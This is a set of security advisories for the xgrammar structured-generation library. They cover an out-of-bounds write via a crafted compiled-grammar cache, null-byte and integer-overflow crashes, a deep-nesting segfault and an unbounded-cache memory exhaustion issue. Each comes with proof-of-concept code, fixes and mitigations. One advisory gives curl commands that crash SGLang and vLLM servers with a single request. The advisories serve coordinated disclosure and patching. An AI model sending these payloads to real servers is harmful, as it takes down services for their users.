summary: Out-of-Bounds Write Through Deserialized Nullable Rule IDs
description:
# Out-of-Bounds Write Through Deserialized Nullable Rule IDs

**Affected repository:** `mlc-ai/xgrammar`
**Observed HEAD:** [`a1a3904fa80316b9fc0f1940285e7792bd2071f7`](https://github.com/mlc-ai/xgrammar/commit/a1a3904fa80316b9fc0f1940285e7792bd2071f7)
**CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H` (5.5 Medium)
**Sink:** `cpp/earley_parser.cc:487` in `xgrammar::EarleyParser::EarleyParser`
**Sanitizer verdict:** AddressSanitizer `heap-buffer-overflow`, `WRITE of size 1`

## Summary

`CompiledGrammar::DeserializeJSON` accepts rule IDs in `grammar.allow_empty_rule_ids` without
checking that they identify a rule in the deserialized grammar. An attacker who can cause an
application to restore an untrusted compiled-grammar cache can put `[1]` in a one-rule artifact.
The artifact is accepted, and constructing `GrammarMatcher` then uses `1` as an unchecked index
into a one-byte nullable-rule vector. AddressSanitizer records a one-byte out-of-bounds write and
process abort during matcher construction.

## Detail

The broken invariant crosses deserialization and matcher initialization: every member of
`allow_empty_rule_ids` must be in the half-open range `[0, grammar.NumRules())`, but the trust
boundary checks only the JSON representation, not that semantic relationship.

In `cpp/compiled_grammar.cc`, `DeserializeJSONValue` asks the generic reflection-based
deserializer to restore the nested `Grammar`:

```cpp
if (object.find("grammar") == object.end()) {
  return ConstructDeserializeError("Expect a 'grammar' field", type_name);
}
AutoDeserializeJSONValue(&(impl->grammar), object["grammar"], type_name);
```

The generic deserializer verifies that `allow_empty_rule_ids` is an array of integers and converts
each value to `int32_t`; it does not know that those integers index `Grammar::Impl::rules_`.
Consequently, the syntactically valid value `1` survives in a grammar containing one rule, even
though the only valid rule ID is `0`. `CompiledGrammar::DeserializeJSON` returns the inconsistent
object as usable.

`GrammarMatcher` construction creates an `EarleyParser`. Its constructor sizes
`rule_is_nullable_` from the trusted rule count and then treats every deserialized nullable-rule ID
as an index:

```cpp
EarleyParser::EarleyParser(const Grammar& grammar, std::optional<ParserState> initial_state)
    : grammar_(grammar),
      fsm_state_flags_cache_(grammar->NumRules()),
      rule_is_nullable_(grammar->NumRules(), 0) {
  // ...
  for (int32_t rule_id : grammar_->allow_empty_rule_ids) {
    rule_is_nullable_[rule_id] = true;
  }
```

For the PoC grammar, `NumRules()` is `1`, so `rule_is_nullable_` owns one byte at index `0`.
Index `1` writes exactly one byte past that allocation. A negative ID is also unsafe because
`std::vector::operator[]` converts it to an unsigned index. This path requires control of a
serialized `CompiledGrammar` artifact and an application that deserializes it and constructs a
matcher. Ordinary EBNF compilation computes valid nullable IDs internally, so grammar text alone
does not reach the vulnerable path. The demonstrated impact is memory corruption and process
abort; code execution was not demonstrated.

## Reproduce

Run this command in a disposable Docker environment. It shallow-clones the current default branch,
prints the resolved revision, builds the public C++ library with AddressSanitizer, modifies a
serialized one-rule grammar through the public API, and constructs `GrammarMatcher`. The
non-interactive debugger disables only ASan's unstable SIGSEGV handler so ASan can emit the full
heap-buffer-overflow diagnostic.

```sh
docker run --rm -i debian:bookworm-slim bash <<'DOCKER'
set -euxo pipefail
export DEBIAN_FRONTEND=noninteractive CMAKE_BUILD_PARALLEL_LEVEL=2
apt-get update -qq
apt-get install -y -qq --no-install-recommends ca-certificates git cmake ninja-build g++ gdb
git clone --depth 1 --quiet https://github.com/mlc-ai/xgrammar.git xgrammar
cd xgrammar
git submodule update --init --recursive --depth 1
git rev-parse HEAD

cat > config.cmake <<'CMAKE'
set(CMAKE_BUILD_TYPE Debug)
set(XGRAMMAR_BUILD_PYTHON_BINDINGS OFF)
set(XGRAMMAR_BUILD_CXX_TESTS OFF)
set(XGRAMMAR_ENABLE_CPPTRACE OFF)
set(XGRAMMAR_ENABLE_INTERNAL_CHECK OFF)
CMAKE

cmake -S . -B build -G Ninja \
  -DCMAKE_CXX_FLAGS='-D_GLIBCXX_NO_ASSERTIONS -fno-lto -fsanitize=address -fno-omit-frame-pointer -g' \
  -DCMAKE_EXE_LINKER_FLAGS='-fno-lto -fsanitize=address'
cmake --build build --target xgrammar -j2

cat > /tmp/repro.cc <<'CPP'
#include <picojson.h>
#include <xgrammar/compiler.h>
#include <xgrammar/matcher.h>
#include <xgrammar/tokenizer_info.h>

#include <cstdint>
#include <iostream>
#include <string>
#include <utility>
#include <variant>

int main() {
  xgrammar::TokenizerInfo tokenizer({"a"});
  xgrammar::GrammarCompiler compiler(tokenizer, 1, false);
  xgrammar::CompiledGrammar compiled = compiler.CompileGrammar("root ::= \"a\"");

  picojson::value artifact;
  const std::string parse_error = picojson::parse(artifact, compiled.SerializeJSON());
  if (!parse_error.empty()) return 2;
  auto& artifact_object = artifact.get<picojson::object>();
  auto& grammar_object = artifact_object.at("grammar").get<picojson::object>();
  picojson::array invalid_rule_ids;
  invalid_rule_ids.emplace_back(static_cast<int64_t>(1));
  grammar_object["allow_empty_rule_ids"] = picojson::value(std::move(invalid_rule_ids));

  auto restored = xgrammar::CompiledGrammar::DeserializeJSON(artifact.serialize(), tokenizer);
  if (!std::holds_alternative<xgrammar::CompiledGrammar>(restored)) {
    std::cerr << "DESERIALIZATION_REJECTED\n";
    return 3;
  }
  std::cerr << "DESERIALIZATION_ACCEPTED\n";
  xgrammar::GrammarMatcher matcher(std::get<xgrammar::CompiledGrammar>(std::move(restored)));
  return 0;
}
CPP

g++ -std=c++17 -D_GLIBCXX_NO_ASSERTIONS -fno-lto -fsanitize=address \
  -fno-omit-frame-pointer -g \
  -Iinclude -I3rdparty/picojson -I3rdparty/dlpack/include \
  /tmp/repro.cc build/libxgrammar.a -pthread -ldl -o /tmp/repro

gdb -q -batch \
  -ex 'set environment ASAN_OPTIONS handle_segv=0:detect_leaks=0' \
  -ex run -ex quit --args /tmp/repro
DOCKER
```

The run at the revision shown above produced:

```text
DESERIALIZATION_ACCEPTED
=================================================================
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 1
    #0 in xgrammar::EarleyParser::EarleyParser(...) cpp/earley_parser.cc:487
    #1 in xgrammar::GrammarMatcher::Impl::Impl(...) cpp/grammar_matcher.cc:475
0 bytes to the right of 1-byte region
SUMMARY: AddressSanitizer: heap-buffer-overflow in xgrammar::EarleyParser::EarleyParser(...)
ABORTING
```

## Credit

Zheng Yu @ Depthfirst

summary: Two denial-of-service crashes in grammar/regex compilation from untrusted input (compile_regex / compile_grammar)
description:
## Summary

`GrammarCompiler` can be crashed (SIGSEGV) by untrusted input through its public compile APIs — the same paths used to enforce structured output from API requests (`guided_regex`, `guided_grammar` / `guided_json` in vLLM, SGLang, mlc-llm). Two distinct issues, both reachable without privileged access and both fixable with small, contained changes. Found via coverage-guided fuzzing (libFuzzer + ASAN); each reproduced on a release (non-sanitizer) build.

**Severity:** Denial of service (remote, unauthenticated, no memory disclosure or code execution observed). This is the same class as the project's prior advisories — GHSA-5cmr-4px5-23pc / CVE-2025-57809 and GHSA-7rgv-gqhr-fxg3 / CVE-2026-25048 — where untrusted-grammar input crashes the host process.

**Affected:** current `main` (verified at commit `ab68350`); the code paths predate it.

---

## Vulnerability 1 — `RegexConverter` null dereference on a zero-codepoint regex

A regex that is a non-empty string but parses to zero UTF-8 codepoints — for example one beginning with a null byte — makes the `RegexConverter` constructor index an empty vector.

`cpp/regex_converter.cc` (constructor):
```cpp
if (!regex.empty()) {
  regex_codepoints_ = ParseUTF8(regex_.c_str(), false);   // c_str() stops at the first NUL
  if (regex_codepoints_[0] == kInvalidUTF8) {             // regex_codepoints_ can be empty here
```
`ParseUTF8` is given `regex_.c_str()`, which terminates at the first null byte, so `"\x00"` is non-empty as a `std::string` but yields an empty codepoint vector; `regex_codepoints_[0]` then reads out of bounds.

**PoC:**
```python
import xgrammar as xgr
c = xgr.GrammarCompiler(xgr.TokenizerInfo([]))
c.compile_regex("\x00")    # SIGSEGV on an unpatched release build
```

**Fix:** route the empty case through the constructor's existing invalid-regex error path:
```cpp
if (regex_codepoints_.empty() || regex_codepoints_[0] == kInvalidUTF8) {
  XGRAMMAR_LOG(FATAL) << "The regex is not a valid UTF-8 string.";
  XGRAMMAR_UNREACHABLE();
}
```
After the fix, the input raises a catchable error (under the default logging configuration, `XGRAMMAR_LOG(FATAL)` throws `std::runtime_error`) instead of crashing.

## Vulnerability 2 — repetition-bound integer overflow → empty-vector crash

A repetition count larger than `INT32_MAX` (but within the grammar's `kMaxIntegerInGrammar = 1e15` limit) overflows when narrowed to `int32_t`, producing a negative bound that mis-routes the repetition expander into an empty-container access. Reachable through **both** a regex and an EBNF grammar.

`cpp/grammar_parser.cc`, `ParseElementWithQuantifier`:
```cpp
auto [lower, upper] = ParseRepetitionRange();
return builder_.AddRepeatFromExpr(
    cur_rule_name_, grammar_expr_id,
    static_cast<int32_t>(lower),                       // no int32 range check
    upper == -1 ? -1 : static_cast<int32_t>(upper));
```
`lower`/`upper` are `int64_t` capped at `1e15`, then narrowed to `int32_t` with no range check. A value like `2222222226` overflows to a negative `int32_t`, which (being ≤ the expander's unzip threshold) routes into `RepetitionRangeExpanderImpl::LegacyHandleRepetitionRange`; there the `upper - lower` loop runs zero times, leaving `rest_rule_ids` empty, and `rest_rule_ids.back()` (`cpp/grammar_functor.cc:1763`) dereferences a null pointer.

**PoC:**
```python
c.compile_regex("a{16222222,2222222226}")                 # SIGSEGV
c.compile_grammar('root ::= "a"{16222222,2222222226}')    # SIGSEGV (same root cause, EBNF path)
```

**Fix:** validate the bounds fit `int32_t` at parse time, using the same error path as the existing `kMaxIntegerInGrammar` check:
```cpp
auto [lower, upper] = ParseRepetitionRange();
constexpr int64_t kMaxRepetitionCount = std::numeric_limits<int32_t>::max();
if (lower > kMaxRepetitionCount || upper > kMaxRepetitionCount) {
  ReportParseError("Repetition count is too large: max allowed is " +
                   std::to_string(kMaxRepetitionCount));
}
return builder_.AddRepeatFromExpr(...);
```

---

## Validation

Both fixes verified on a release (non-ASAN) build from `ab68350`:
- Before: each PoC SIGSEGVs.
- After: each PoC raises a catchable error; valid inputs are unaffected (`a{2,5}`, `[0-9]+`, `(ab|cd)*`, `root ::= "a"{2,5}`, JSON schemas all still compile). A coverage-guided re-run over the fuzzer's crash corpus shows no remaining crashes on these paths.
- A regression test asserting both PoCs raise (not crash) is included with the patch.

## Notes for the maintainer (private)
- **Adjacent prior work:** the V1 area is near the empty-pattern handling added in PR #409; this is a different input class (non-empty string that parses to empty) that the `regex.empty()` guard there does not cover. Flagging for context since you own that code.
- **Separate, non-crash observation (out of scope):** because `ParseUTF8` uses `c_str()`, a regex with an embedded NUL (e.g. `"a\x00b"`) is silently truncated at the NUL rather than rejected. This does not crash (the vector is non-empty), but the silent truncation may be worth a separate look.
- **Separate, lower-severity observation:** fuzzing also surfaced an out-of-bounds *read* in the grammar optimizer (`Grammar::Impl::GetGrammarExpr`, reached via `RuleInliner` during `CompileGrammar` on certain crafted EBNF). AddressSanitizer flags it, but it did **not** crash a release (non-sanitizer) build in our testing and we observed no information disclosure — so we report it only as a hardening note, not a DoS, to be transparent rather than overstate it. Happy to share a reproducer if useful.
- **Separate, non-crash correctness note:** `json_schema_converter.cc` performs its own unchecked `static_cast<int>` of `maxLength`/`minLength`/`maxItems` (around lines 521, 529, 1490). With Vulnerability 2 fixed this does **not** crash (an overflowed-negative value lexes as an identifier and is rejected by the integer parser; an overflow that wraps to a small positive yields a silently-wrong bound), but the silent-wrong-bound case is a minor correctness issue worth a look while you're in this code.

## Credits
Found via coverage-guided fuzzing (libFuzzer + AddressSanitizer) of the grammar/regex compile path.

## Disclosure
Reported privately per coordinated disclosure. Requesting a fix + one or two CVE IDs as appropriate (the two issues have distinct root causes in different files); happy to coordinate a public-disclosure date and provide the patch as a PR once a fix is ready.

summary: xgrammar Null Byte Memory-Safety Violation in RegexConverter
description:
### Summary

A vulnerability in `xgrammar`'s C++ regex-to-EBNF converter allows an attacker to terminate the host process via unchecked vector access (undefined behavior). In tested wheels, this consistently manifests as a process-killing SIGSEGV. Unlike typical malformed-regex errors, the null-byte path short-circuits into native undefined behavior before standard exception handling machinery executes, making it uncatchable by downstream Python servers.

Because `xgrammar` is a core backend for structured generation in **SGLang** and **vLLM**, this vulnerability allows an attacker to crash inference nodes with a single malformed API request.

## Vulnerability Details
The vulnerability stems from an impedance mismatch between Python's length-aware string representation and C/C++'s null-terminated string convention.

### The Vulnerable Code

**`RegexConverter` constructor** — [`cpp/regex_converter.cc` (lines 25–33)](https://github.com/mlc-ai/xgrammar/blob/918f8a0/cpp/regex_converter.cc#L25-L33):
- **[1]** Line 26: `!regex.empty()` — guard passes because `std::string` length is 1.
- **[2]** Line 27: `ParseUTF8(regex_.c_str(), false)` — delegates to the null-terminated parser.
- **[3]** Line 28: `regex_codepoints_[0]` — **BUG**: unchecked access on a potentially empty vector.

**`ParseUTF8` function** — [`cpp/support/encoding.h` (lines 218–232)](https://github.com/mlc-ai/xgrammar/blob/918f8a0/cpp/support/encoding.h#L218-L232):
- **[4]** Line 220: `while (*utf8 != 0)` — null-terminated loop that never executes when the first byte is `\x00`, returning an empty vector.

### Execution Trace for Payload `"\x00"` (1 byte)

| Step | Code | What Happens |
|------|------|-------------|
| **[1]** | `!regex.empty()` | `std::string` tracks length independently of string content. Length is 1, so this evaluates to `true`. The guard passes. |
| **[2]** | `ParseUTF8(regex_.c_str(), false)` | `c_str()` returns a pointer starting with `0x00`. `ParseUTF8` enters its `while (*utf8 != 0)` loop. The very first byte is `0x00`, so the loop body **never executes**. An empty `std::vector` (size 0) is returned. |
| **[3]** | `regex_codepoints_[0]` | Accesses index 0 of an empty vector. This is **undefined behavior** per the C++ standard. |

*(Note: While C++ UB outcomes can be unpredictable, in all tested PyPI binary wheels on glibc Linux (0.1.32, 0.1.33), this consistently manifests as an immediate SIGSEGV, terminating the OS process.)*

### PoC
### Minimal Reproducer (Standalone)

```python
#!/usr/bin/env python3
"""
xgrammar null byte memory-safety violation PoC
WARNING: Run this in a dedicated process, as it will kill the interpreter.
"""
import xgrammar as xgr

tokenizer_info = xgr.TokenizerInfo(
    encoded_vocab=[f"tok_{i}" for i in range(100)],
    vocab_size=100,
)
compiler = xgr.GrammarCompiler(tokenizer_info)

# This line drops to C++ UB -> SIGSEGV. You will not see the print statement.
compiler.compile_regex("\x00")
print("SAFE — bug is patched")
```

## Related Finding: Silent Constraint Truncation

If the null byte is **not** at the start of the string (e.g., `a\x00b`), the library does not crash. Instead, the regex, JSON schema, or EBNF grammar is **silently truncated** at the null byte. While we have not demonstrated a concrete exploit chain for this in downstream servers, it represents a related correctness issue arising from the same root cause.

This is contingent on a pre-existing injection sink (e.g., an application interpolating untrusted user input directly into a constructed regex string or schema). If a null byte is injected, it truncates the regex, weakening validation and potentially allowing unexpected outputs to pass.

## Recommended Fix

### Option 1: Guard the Vector Access (DoS Remediation)

```cpp
explicit RegexConverter(const std::string& regex) : regex_(regex) {
  if (!regex.empty()) {
    regex_codepoints_ = ParseUTF8(regex_.c_str(), false);
    // Add .empty() check to prevent UB array access.
    // C++ short-circuit evaluation guarantees [0] is never reached when empty.
    if (regex_codepoints_.empty() || regex_codepoints_[0] == kInvalidUTF8) {
      XGRAMMAR_LOG(FATAL) << "The regex is not a valid UTF-8 string.";
      XGRAMMAR_UNREACHABLE();
    }
  }
  regex_codepoints_.push_back(0);
}
```
**Why this works:** An explicit empty-input guard removes the native UB and turns this path into an ordinary validation failure, allowing the library to handle it safely without crashing the host process.

### Option 2: Length-Aware `ParseUTF8` (Correctness Remediation)

Replace the null-terminated `const char*` interface with a length-aware signature, e.g. `ParseUTF8(regex_.data(), regex_.size(), false)`.

**Why this is necessary:** Option 1 stops the crash, but it does NOT stop the **silent truncation** behavior. Only length-aware parsing respects the full Python-passed binary string sequence across the FFI boundary.

### Downstream Mitigation (SGLang / vLLM)

Until `xgrammar` is patched, inference servers should reject regex and schema strings containing null bytes at the application layer. **Do not merely sanitize leading null bytes — sanitize all null bytes to prevent truncation bypasses.**

```python
def assert_no_null_bytes(val):
    if isinstance(val, str) and "\x00" in val:
        raise ValueError("Constraints must not contain null bytes")
    # For JSON schemas/EBNF grammars: if passed as a nested dict,
    # serialize to string (e.g., json.dumps) before checking, or
    # recursively traverse all string values in the structure.

# Check all structured generation inputs:
assert_no_null_bytes(request.guided_regex)
assert_no_null_bytes(request.guided_json)
assert_no_null_bytes(request.guided_grammar)
# and equivalent structured_outputs fields...
```

## Exploitation Examples

### Attack Vector: SGLang HTTP API
SGLang evaluates `sampling_params.regex` without sanitizing it prior to backend delegation.

```bash
# Terminate the inference server instantly (default port 30000)
curl -s http://<sglang-host>:30000/generate \
  -H "Content-Type: application/json" \
  -d '{"text": "test", "sampling_params": {"regex": "\u0000"}}'
```

### Attack Vector: vLLM HTTP API
vLLM's `auto` structured output backend delegates regex parsing to `xgrammar` (the default for regex constraints). Using the OpenAI-compatible API, this is triggered via `structured_outputs.regex`.

```bash
# Terminate the inference server (default port 8000)
curl -s http://<vllm-host>:8000/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "any-loaded-model",
    "messages": [{"role": "user", "content": "test"}],
    "structured_outputs": {
      "regex": "\u0000"
    }
  }'
```
*(Note: On older vLLM versions, this is reachable by passing `"guided_regex": "\u0000"` at the top level of the JSON request.)*

### Summary

The multi-level nested syntax caused a segmentation fault (core dumped).



### Details

Trigger stack overflow or memory exhaustion by constructing a malicious grammar rule containing 30,000 layers of nested parentheses

### PoC

```
#!/usr/bin/env python3
"""
XGrammar - Math Expression Generation Example
"""

import xgrammar as xgr
import torch
from transformers import AutoModelForCausalLM, AutoTokenizer, AutoConfig

s = '(' * 30000 + 'a'
grammar = f"root ::= {s}"

def main():
    device = "cuda" if torch.cuda.is_available() else "cpu"
    model_name = "Qwen/Qwen2.5-0.5B-Instruct"
    
    # Load model
    model = AutoModelForCausalLM.from_pretrained(
        model_name,
        torch_dtype=torch.float16 if device == "cuda" else torch.float32,
        device_map=device
    )
    tokenizer = AutoTokenizer.from_pretrained(model_name)
    config = AutoConfig.from_pretrained(model_name)
    
    # Math expression grammar
    math_grammar = grammar
    
    # Setup
    tokenizer_info = xgr.TokenizerInfo.from_huggingface(
        tokenizer,
        vocab_size=config.vocab_size
    )
    compiler = xgr.GrammarCompiler(tokenizer_info)
    compiled_grammar = compiler.compile_grammar(math_grammar)
    
    # Generate
    prompt = "Math: "
    inputs = tokenizer(prompt, return_tensors="pt").to(device)
    
    xgr_processor = xgr.contrib.hf.LogitsProcessor(compiled_grammar)
    
    output_ids = model.generate(
        **inputs,
        max_new_tokens=50,
        logits_processor=[xgr_processor]
    )
    
    result = tokenizer.decode(
        output_ids[0][len(inputs.input_ids[0]):],
        skip_special_tokens=True
    )
    
    print(f"Generated expression: {result}")

if __name__ == "__main__":
    main()
```

```
> pip show xgrammar
Name: xgrammar
Version: 0.1.31
Summary: Efficient, Flexible and Portable Structured Generation
Home-page: 
Author: MLC Team

> python3 1.py

```


### Impact

DoS

summary: Denial of Service by abusing xgrammar unbounded cache in memory
description:
### Summary

Xgrammar includes a cache for compiled grammars to increase performance with repeated use of the same grammar. This cache is held in memory. Since the cache is unbounded, a system making use of xgrammar can be abused to fill up a host's memory and case a denial of service. For example, sending many small requests to an LLM inference server with unique JSON schemas would eventually cause this denial of service to occur.

### Details

The fix is to add a limit to the cache size. This was done in https://github.com/mlc-ai/xgrammar/pull/243

An example of making use of the new cache size limit can be found in vLLM here: https://github.com/vllm-project/vllm/pull/16283

### Impact

Any system making use of Xgrammar and taking requests as input from potentially untrusted parties would be vulnerable to this denial of service issue.
